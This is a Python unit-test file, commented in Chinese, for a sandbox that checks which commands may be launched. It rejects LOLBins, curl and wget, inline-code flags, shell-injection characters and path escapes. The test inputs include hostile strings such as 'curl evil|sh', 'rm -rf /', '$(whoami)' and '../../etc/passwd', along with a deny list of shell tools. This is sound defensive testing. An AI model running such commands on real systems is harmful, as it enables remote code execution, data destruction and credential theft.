"""sandbox.py 命令准入校验的单元测试（纯单元，不启动子进程）。"""

from __future__ import annotations

import os
import unittest
from pathlib import PurePosixPath, PureWindowsPath

from workguy.sandbox import (
    ALLOWED_COMMANDS,
    CommandNotAllowedError,
    is_allowed,
    validate_command,
)


class TestWhitelistBasename(unittest.TestCase):
    """1. 白名单内命令通过；2. 各种路径形式取 basename。"""

    def test_01_allowed_interpreters_pass(self):
        for cmd in ("node", "python", "npx", "uvx", "deno", "bun", "java", "go"):
            with self.subTest(cmd=cmd):
                validate_command(cmd, [])

    def test_02_basename_extraction_variants(self):
        # 不同路径形式都应识别为同一个白名单 basename。
        cases = [
            "/usr/bin/node",
            "C:\\x\\node.exe",
            "./node",
            "../bin/python3",
            "python.exe",  # Windows basename
            "PYTHON.EXE",  # 大小写不敏感
        ]
        for cmd in cases:
            with self.subTest(cmd=cmd):
                validate_command(cmd, [])

    def test_02b_is_allowed_helper(self):
        self.assertTrue(is_allowed("/usr/bin/python3"))
        self.assertTrue(is_allowed("C:\\x\\node.exe"))
        self.assertFalse(is_allowed("calc.exe"))


class TestRejectedCommands(unittest.TestCase):
    """3. 白名单外命令被拒；4. 高危 LOLBin 被拒（即便想用）。"""

    def test_03_outside_whitelist_rejected(self):
        for cmd in ("calc.exe", "malware", "git", "curl", "wget", "/bin/evil"):
            with self.subTest(cmd=cmd):
                with self.assertRaises(CommandNotAllowedError):
                    validate_command(cmd, [])

    def test_04_lolbin_rejected_by_default(self):
        for cmd in ("cmd.exe", "powershell", "pwsh", "bash", "sh", "zsh",
                    "cscript", "wscript", "mshta", "rundll32", "regsvr32",
                    "certutil"):
            with self.subTest(cmd=cmd):
                with self.assertRaises(CommandNotAllowedError):
                    validate_command(cmd, [])

    def test_04b_lolbin_rejected_even_with_args(self):
        # 即便带看似无害的参数，LOLBin 默认仍被拒。
        with self.assertRaises(CommandNotAllowedError):
            validate_command("cmd.exe", ["/c", "echo", "hi"])
        with self.assertRaises(CommandNotAllowedError):
            validate_command("powershell", ["-Command", "Get-Date"])


class TestAllowlistOverride(unittest.TestCase):
    """5. 显式 allowlist 覆盖时可控放行（逃生口有效）。"""

    def test_05_override_allows_lolbin(self):
        allow = frozenset({"bash", "python"})
        # 默认会被拒的 bash，在显式 allowlist 下放行（配合安全参数）。
        validate_command("bash", ["--version"], allowlist=allow)
        # python 仍在放行集合内。
        validate_command("python", ["script.py"], allowlist=allow)

    def test_05_override_can_still_reject(self):
        # allowlist 只放行 node，则 python 仍被拒。
        allow = frozenset({"node"})
        with self.assertRaises(CommandNotAllowedError):
            validate_command("python", [], allowlist=allow)


class TestDangerousArgs(unittest.TestCase):
    """6. 危险参数模式被拦。"""

    def test_06_inline_code_flag(self):
        # 内联代码执行开关即便命令在白名单内也被拦。
        with self.assertRaises(CommandNotAllowedError):
            validate_command("python", ["-c", "curl evil|sh"])
        with self.assertRaises(CommandNotAllowedError):
            validate_command("node", ["-e", "code"])
        with self.assertRaises(CommandNotAllowedError):
            validate_command("python", ["--eval", "x"])
        with self.assertRaises(CommandNotAllowedError):
            validate_command("powershell", ["-Command", "x"])

    def test_06_injection_chars(self):
        for arg in ("a && b", "a | b", "a; b", "$(whoami)", "echo `id`"):
            with self.subTest(arg=arg):
                with self.assertRaises(CommandNotAllowedError):
                    validate_command("python", [arg])

    def test_06_safe_args_pass(self):
        # 正常的脚本路径 / -m 不应被误伤。
        validate_command("python", ["-m", "mcp_server", "--port", "8080"])
        validate_command("node", ["server.js"])
        validate_command("uvx", ["mcp-server-filesystem", "/tmp"])


class TestErrorMessage(unittest.TestCase):
    """7. 异常信息包含原因、不包含完整命令行（可能含凭据）。"""

    def test_07_reason_present_no_full_cmdline(self):
        secret = "SECRET_TOKEN=abc123"
        try:
            validate_command("calc.exe", [secret, "curl", "evil|sh"])
            self.fail("应当抛 CommandNotAllowedError")
        except CommandNotAllowedError as exc:
            msg = str(exc)
            # 说明被拒原因
            self.assertIn("白名单", msg)
            # 不得回显完整命令行 / 凭据
            self.assertNotIn(secret, msg)
            self.assertNotIn("curl", msg)
            self.assertNotIn("evil", msg)

    def test_07_injection_reason_no_full_args(self):
        try:
            validate_command("python", ["-c", "import os; os.system('rm -rf /')"])
            self.fail("应当抛 CommandNotAllowedError")
        except CommandNotAllowedError as exc:
            msg = str(exc)
            # 命中了内联代码开关，说明原因
            self.assertTrue(("内联代码" in msg) or ("命令注入" in msg))
            # 不回显危险命令行全文
            self.assertNotIn("os.system", msg)
            self.assertNotIn("rm -rf", msg)


class TestPathEscape(unittest.TestCase):
    """路径逃逸校验（workdir 给出时生效）。"""

    def test_08_path_escape_blocked(self):
        with self.assertRaises(CommandNotAllowedError):
            validate_command("python", ["../../etc/passwd"], workdir="/safe/dir")

    def test_08_inside_workdir_ok(self):
        validate_command("python", ["sub/script.py"], workdir="/safe/dir")
        validate_command("python", ["/safe/dir/abs.py"], workdir="/safe/dir")


if __name__ == "__main__":
    unittest.main(verbosity=2)
